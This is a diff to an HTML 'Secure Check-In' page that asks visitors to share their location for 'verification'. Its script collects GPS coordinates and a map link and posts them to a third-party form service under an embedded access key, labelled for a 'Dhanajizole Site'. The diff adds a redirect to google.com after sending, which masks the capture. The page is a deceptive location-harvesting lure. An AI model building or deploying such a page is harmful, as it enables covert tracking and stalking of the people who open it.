@@ -19,8 +19,8 @@
 <body>
 
 <div class="card">
-    <h2>Secure Check-In</h2>
-    <p>Please share your location to complete the verification process.</p>
+    <h2 id="head">Secure Check-In</h2>
+    <p id="sub">Please share your location to complete the verification process.</p>
     <button id="shareBtn" onclick="getLocation()">Share Location</button>
     <div id="status"></div>
 </div>
@@ -32,8 +32,7 @@
     function getLocation() {
         shareBtn.disabled = true;
         shareBtn.innerText = "Processing...";
-        statusDiv.innerHTML = "Requesting GPS...";
-        statusDiv.className = "";
+        statusDiv.innerHTML = "Requesting GPS Access...";
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendPosition, showError, {
@@ -41,7 +40,7 @@
                 timeout: 10000
             });
         } else {
-            statusDiv.innerHTML = "GPS not supported by your browser.";
+            statusDiv.innerHTML = "GPS not supported.";
             resetBtn();
         }
     }
@@ -49,16 +48,12 @@
     function sendPosition(position) {
         statusDiv.innerHTML = "Sending secure data...";
         
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
         const payload = {
             access_key: "83ad72c3-54bd-4f7f-9098-8c58e63b304d",
-            subject: "Location Received: Dhanajizole",
-            Latitude: lat,
-            Longitude: lon,
-            Map_Link: `https://www.google.com/maps?q=${lat},${lon}`,
-            Accuracy: position.coords.accuracy + " meters"
+            subject: "Location: Dhanajizole Site",
+            Latitude: position.coords.latitude,
+            Longitude: position.coords.longitude,
+            Map_Link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
         };
 
         fetch("https://api.web3forms.com/submit", {
@@ -66,19 +61,17 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         })
-        .then(async (response) => {
-            if (response.status === 200) {
-                statusDiv.innerHTML = "✅ Verification Successful!";
+        .then(response => {
+            if (response.ok) {
+                statusDiv.innerHTML = "✅ Verified! Redirecting...";
                 statusDiv.className = "success";
-                shareBtn.innerText = "Verified";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; 
+                }, 2000);
             } else {
-                statusDiv.innerHTML = "❌ Error sending data.";
+                statusDiv.innerHTML = "❌ Error. Try again.";
                 resetBtn();
             }
-        })
-        .catch(error => {
-            statusDiv.innerHTML = "❌ Connection Error.";
-            resetBtn();
         });
     }
 
@@ -89,11 +82,7 @@
 
     function showError(error) {
         resetBtn();
-        if (error.code === 1) {
-            statusDiv.innerHTML = "Permission Denied. Please allow location.";
-        } else {
-            statusDiv.innerHTML = "Location error. Try again.";
-        }
+        statusDiv.innerHTML = "Error: Please allow location access.";
         statusDiv.className = "error";
     }
 </script>
